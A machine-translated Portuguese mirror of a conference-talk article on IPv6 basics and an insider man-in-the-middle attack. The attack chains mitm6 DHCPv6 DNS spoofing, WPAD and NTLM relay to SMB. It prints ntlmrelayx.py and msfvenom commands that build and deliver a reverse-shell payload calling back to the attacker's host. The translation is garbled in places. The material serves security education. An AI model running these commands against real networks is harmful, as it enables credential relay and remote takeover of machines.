<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üéä üë©üèª‚Äçü§ù‚Äçüë®üèΩ üõ©Ô∏è Onde inserir aspas no IPv6 üçè üçπ üë®‚Äçüé§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="IPv6 √© uma nova vers√£o do protocolo da Internet. Os membros da IETF aceitaram apenas 22 anos atr√°s, em 1996. Durante esse per√≠odo, ataques IPv6 espec√≠...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Onde inserir aspas no IPv6</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pm/blog/417285/"> IPv6 √© uma nova vers√£o do protocolo da Internet.  Os membros da IETF aceitaram apenas 22 anos atr√°s, em 1996.  Durante esse per√≠odo, ataques IPv6 espec√≠ficos conseguiram aparecer.  O objetivo deste artigo, com base em nossa apresenta√ß√£o no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PHDays 8,</a> √© mostrar as possibilidades de um ataque √†s redes corporativas por um intruso interno usando IPv4 e IPv6. <br><br><img src="https://habrastorage.org/webt/ls/nb/b7/lsnbb7p7odub6aicoy6uylbvcak.png"><br><a name="habracut"></a><br><h2>  No√ß√µes b√°sicas de endere√ßamento IPv6 </h2><br>  O comprimento do endere√ßo IPv6 √© de 128 bits, escritos em formato hexadecimal com a divis√£o do endere√ßo inteiro em 8 grupos.  Um exemplo de grava√ß√£o de um endere√ßo IPv6: <br><br>  2001: 0a00: caf√©: beb√™: 0001: 0000: 0000: 0011/64 <br><br>  H√° um registro de endere√ßo simplificado quando v√°rios grupos subseq√ºentes de zeros podem ser substitu√≠dos por "::", mas apenas uma vez.  Zeros gravados √† esquerda em cada grupo podem ser descartados.  Portanto, o endere√ßo acima pode ser escrito como: <br><br>  2001: a00: cafe: babe: 1 :: 11/64 <br><br>  O tamanho padr√£o da parte do host emitida pelo provedor para o cliente √© de 64 bits, dos quais 4 s√£o usados ‚Äã‚Äãpara segmentar a rede em sub-redes. <br><br><img src="https://habrastorage.org/webt/ae/0r/2b/ae0r2bmvkfpwm8bvbwdlui_560i.png"><br><br>  Existem v√°rios tipos de endere√ßos no IPv6: <br><br><img src="https://habrastorage.org/webt/cr/e2/zz/cre2zzzair09k_qyg-ozm_olyno.png"><br>  <b>O unicast global</b> √© um an√°logo de endere√ßos p√∫blicos no IPv4.  Esses endere√ßos s√£o emitidos pela <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">IANA</a> e s√£o √∫nicos em toda a Internet.  Esses endere√ßos est√£o no intervalo 2000 :: / 3 (2000 - 3FFF). <br><br>  <b>Endere√ßos locais (link local)</b> - os endere√ßos no intervalo FE80 :: / 10 (FE80 - FEBF) s√£o gerados automaticamente pelos dispositivos e usados ‚Äã‚Äãpara interagir com outros dispositivos na mesma rede local.  O tr√°fego que cont√©m esse endere√ßo como remetente ou destinat√°rio n√£o deve ser roteado.  Portanto, um dispositivo compat√≠vel com IPv6 e conectado √† rede pode trocar informa√ß√µes imediatamente dentro de sua sub-rede sem nenhuma configura√ß√£o. <br><br>  <b>Endere√ßo de loopback :: 1</b> .  Este endere√ßo √© semelhante ao 127.0.0.1 no IPv4.  Pacotes enviados a ele n√£o saem do dispositivo. <br><br>  <b>Endere√ßo n√£o especificado</b> - o endere√ßo "::", composto apenas por zeros.  √â usado em alguns casos como remetente at√© o endere√ßo ser recebido. <br><br>  <b>Endere√ßos locais exclusivos (local exclusivo)</b> - um an√°logo de endere√ßos privados no IPv4, pode ser roteado na rede interna da organiza√ß√£o, sem a possibilidade de roteamento para a Internet.  O espa√ßo de endere√ßo IPv6 √© t√£o grande que mais de um trilh√£o de endere√ßos pode ser emitido para todas as pessoas no planeta e elas n√£o terminam.  Portanto, o IPv6 implica o abandono de endere√ßos privados no sentido em que foram usados ‚Äã‚Äãno IPv4 devido √† falta de endere√ßos p√∫blicos. <br><br>  <b>Endere√ßos IPv4 mapeados para IPv6 (IPv4 incorporado)</b> - Endere√ßos IPv6 iniciados por :: ffff: os √∫ltimos 32 bits cont√™m um endere√ßo IPv4 (:: ffff: xxxx: xxxx, em que xxxx: xxxx √© o endere√ßo IPv4 convertido em hexadecimal).  Esses endere√ßos s√£o usados ‚Äã‚Äãpara dispositivos que n√£o suportam IPv6 e fornecem uma maneira de mapear um espa√ßo de endere√ßo IPv4 para um espa√ßo de endere√ßo IPv6. <br><br>  <b>Endere√ßos multicast (Multicast)</b> - uma das principais altera√ß√µes no IPv6 em compara√ß√£o ao IPv4.  O novo protocolo recusou pacotes de difus√£o, em vez dos endere√ßos multicast de endere√ßos de difus√£o.  Todos esses endere√ßos est√£o no intervalo FF00 :: / 8 <br><br><img src="https://habrastorage.org/webt/gw/io/c6/gwioc6toxuatii_wzugt5yb3j2w.png"><br><br><h3>  Atribui√ß√£o de Endere√ßo IPv6 </h3><br>  O IPv6 usa o ND (ICMPv6 Neighbor Discovery Protocol) para obter informa√ß√µes de endere√ßo.  Conforme mostrado na figura abaixo, quando um novo dispositivo aparece na rede IPv6, o dispositivo envia uma solicita√ß√£o para obter um endere√ßo IPv6 (Solicita√ß√£o de roteador) para ‚Äúff02 :: 2‚Äù (todos os roteadores de rede).  O roteador responde com uma mensagem (An√∫ncio do roteador) contendo informa√ß√µes sobre como obter o endere√ßo IPv6.  Dependendo dos sinalizadores definidos na mensagem, h√° tr√™s maneiras: <br><table><tbody><tr><th>  A maneira de obter o endere√ßo </th><th>  Um sinalizador (autom√°tico) </th><th>  Sinalizador O (Outro) </th><th>  Sinalizador M (gerenciado) </th></tr><tr><td>  SLAAC (padr√£o) </td><td>  1 </td><td>  0 0 </td><td>  0 0 </td></tr><tr><td>  SLAAC + DHCPv6 </td><td>  1 </td><td>  1 </td><td>  0 0 </td></tr><tr><td>  DHCPv6 </td><td>  0 0 </td><td>  - </td><td>  1 </td></tr></tbody></table><br>  <b>SLAAC</b> (Configura√ß√£o autom√°tica de endere√ßo sem estado) - Nesse caso, tudo o que √© necess√°rio para gerar um endere√ßo IPv6 global est√° na mensagem RA. <br><br>  <b>SLAAC + DHCPv6</b> - Assim como no caso do SLAAC, o endere√ßo √© gerado com base nas informa√ß√µes do pacote RA, mas o sinalizador O √© definido adicionalmente, o que significa Outra configura√ß√£o, e o dispositivo deve entrar em contato com o servidor DHCPv6 para obter configura√ß√µes adicionais, por exemplo, o servidor DNS. <br><br>  <b>DHCPv6</b> √© um an√°logo do endere√ßo DHCPv4 e todas as outras informa√ß√µes s√£o emitidas pelo servidor DHCP, com exce√ß√£o do gateway padr√£o, que √© obtido do endere√ßo do remetente do pacote RA. <br><br>  Quando os sinalizadores O e M s√£o definidos ao mesmo tempo, o sinalizador O √© ignorado. <br><br><img src="https://habrastorage.org/webt/qx/nh/yw/qxnhywmpu6bpogmnss7c0emprpa.jpeg"><br>  Como exemplo, pegue o utilit√°rio fake_router26 do pacote de utilit√°rios <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">thc-ipv6</a> .  A imagem mostra que, ap√≥s a inicializa√ß√£o, foi adicionado o endere√ßo IPv6 do gateway padr√£o, que se tornou prioridade sobre o IPv4. <br><br><img src="https://habrastorage.org/webt/mr/qc/45/mrqc45-7fxz_clcr6affsl69i9e.png"><br><br><h2>  Ataque! </h2><br>  Nesse cen√°rio, consideraremos a possibilidade de um ataque man-in-the-middle usando o mecanismo para obter as configura√ß√µes de rede IPv6. <br><br>  Para demonstra√ß√£o, precisamos de 4 carros: <br><br>  <b>A m√°quina atacante √© o</b> Kali Linux. <br><br><img src="https://habrastorage.org/webt/2z/rj/2p/2zrj2parlezr5m5thp1abcskgxo.png"><br><br>  <b>A m√°quina servidor</b> na qual as esferas administrativas do Windows 7 ser√£o ativadas. <br><br><img src="https://habrastorage.org/webt/tl/n3/qj/tln3qjafwp_zhancgxbpogpd5u4.png"><br><br>  <b>Uma m√°quina cliente</b> que ter√° acesso a um servidor Windows 7. <br><br><img src="https://habrastorage.org/webt/ob/vb/82/obvb82baad3u7bd4cmjlm-54atc.png"><br><br>  Um roteador com DHCPv4 ativado. <br><br>  dirkjanm descreveu a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">metodologia para</a> este cen√°rio.  Ele escreveu o utilit√°rio mitm6, que, usando o protocolo ND, envia mensagens de propaganda do roteador com os sinalizadores "O" e "M" definidos como "1".  Portanto, os clientes sabem que √© necess√°rio solicitar informa√ß√µes de endere√ßo de um servidor DHCPv6.  Os clientes come√ßam a enviar mensagens SOLICIT do DHCPv6 para descobrir o servidor DHCP.  O utilit√°rio responde a solicita√ß√µes com mensagens DHCPv6 ADVERTISE;  a resposta cont√©m o endere√ßo da m√°quina atacante como um servidor DNS. <br><br><img alt="Solicita√ß√£o de informa√ß√µes de endere√ßo enviadas ao endere√ßo multicast de todos os servidores DHCP ff02 :: 1: 2" src="https://habrastorage.org/webt/ze/if/di/zeifdiuqvmjxgmsakw5nz5dqqau.png"><br><br>  Depois disso, devido aos recursos arquiteturais do sistema operacional, o DNS DHCPv6 se torna uma prioridade.  Agora, o invasor pode responder a qualquer consulta DNS com o endere√ßo certo.  Assim, a solicita√ß√£o enviada pelo nome de dom√≠nio ser√° enviada a crit√©rio do invasor. <br><br>  Ao executar mitm6, voc√™ pode especificar o dom√≠nio pelo qual substituir os endere√ßos DNS. <br><br><img src="https://habrastorage.org/webt/cj/b5/mt/cjb5mthduecqu62-iig9ed9u24w.png"><br><br><img src="https://habrastorage.org/webt/ox/bz/bu/oxbzbuxhk777trjsfvr4idkkgdw.png"><br><br><h2>  Bolas de administra√ß√£o </h2><br>  Para aprimorar o efeito dram√°tico, suponha que exista outra m√°quina na rede na qual o usu√°rio da primeira m√°quina possa se conectar a esferas administrativas.  Por padr√£o, eles est√£o desativados, mas na Internet muitas pessoas est√£o interessadas em como ativ√°-las e ficam muito felizes quando conseguem. <br><br><img src="https://habrastorage.org/webt/gi/yj/qt/giyjqt4gwprslmxgsgc_i2b_5_k.jpeg"><br><br><img src="https://habrastorage.org/webt/d-/gg/mp/d-ggmpf_b9oztu5dfrotewmbw9o.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O WPAD</a> (Descoberta Autom√°tica de Proxy da Web) √© um protocolo para determinar o local do arquivo no qual as configura√ß√µes de proxy padr√£o est√£o localizadas. <br><br>  Ap√≥s a atualiza√ß√£o do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">MS16-077, o wpad</a> n√£o √© mais fornecido pelo NETBIOS e n√£o √© autenticado automaticamente no servidor proxy. <br><br>  Para ignorar essas restri√ß√µes, voc√™ pode usar o ntlmrelayx.py, que faz parte do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">impacket</a> .  √â necess√°ria uma vers√£o superior a 0.9.16, que inclui suporte a IPv6 e a capacidade de instalar um servidor que processa o wpad v√°lido.  O lan√ßamento √© feito pela equipe <br><br><pre><code class="bash hljs">ntlmrelayx.py -6 -wh at.localdomain -t smb://192.168.56.7 -e 1.exe</code> </pre> <br>  onde 1.exe √© a carga √∫til do shell reverso gerada pelo metasplit. <br><br><pre> <code class="bash hljs">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.6 LPORT=444 -f exe -o 1.exe</code> </pre> <br>  o par√¢metro -wh indica o host em que o arquivo wpad est√° localizado (o utilit√°rio mitm6 responder√° com o endere√ßo do invasor a esta solicita√ß√£o) <br><br><img src="https://habrastorage.org/webt/4e/ew/hh/4eewhhpvwjynispsnazoyftxtus.png"><br><br><img src="https://habrastorage.org/webt/p1/it/aa/p1itaa9idtzcavemj45sgzsbeeq.png"><br><br>  Ap√≥s a conex√£o, ser√° solicitada a autentica√ß√£o HTTP 407 (Proxy Authentication Required), na qual o navegador √© autenticado automaticamente. <br><br><img src="https://habrastorage.org/webt/fw/hn/qz/fwhnqzgqri-snconlo2sdpubcmc.png"><br><br><img src="https://habrastorage.org/webt/f5/hf/1x/f5hf1xuyeourcueod8v70dqilsa.png"><br><br>  Os dados recebidos ser√£o usados ‚Äã‚Äãpara conectar-se ao SMB do servidor atacado, transmitidos pelo par√¢metro -t. <br><br><img src="https://habrastorage.org/webt/xa/hu/0e/xahu0errtgiiuzu9j_b1990pryq.png"><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WO2jeo85Mpg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  Agrade√ßo ao meu co-autor Sergey Ovchinnikov <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">malchikserega</a> pela ajuda na prepara√ß√£o da apresenta√ß√£o e do artigo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt417285/">https://habr.com/ru/post/pt417285/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt417271/index.html">Um hacker pode bloquear o canal em ingl√™s?</a></li>
<li><a href="../pt417273/index.html">Realiza√ß√£o de um guia de voz baseado no YandexSpeechKit</a></li>
<li><a href="../pt417275/index.html">7 habilidades de designers eficazes. Poderosas ferramentas de desenvolvimento de carreira</a></li>
<li><a href="../pt417277/index.html">Bibliotecas gratuitas para criar e editar arquivos PDF</a></li>
<li><a href="../pt417283/index.html">A Disney lan√ßou seu pr√≥prio sistema de anima√ß√£o capilar HairControl</a></li>
<li><a href="../pt417287/index.html">"Calend√°rio do testador" para julho. Teste de an√°lise</a></li>
<li><a href="../pt417289/index.html">Di√°rio do Estagi√°rio: Dia 1. Trainee to Junior</a></li>
<li><a href="../pt417293/index.html">Recupera√ß√£o de senha e armazenamento prim√°rio na nuvem, ou O que h√° de novo no Zimbra 8.8.9</a></li>
<li><a href="../pt417295/index.html">Como eu escrevi a biblioteca C ++ 11 padr√£o ou por que o impulso √© t√£o assustador? Cap√≠tulo 3</a></li>
<li><a href="../pt417297/index.html">Medo e avers√£o √† intelig√™ncia sobre amea√ßas ou 8 dicas pr√°ticas da TI</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>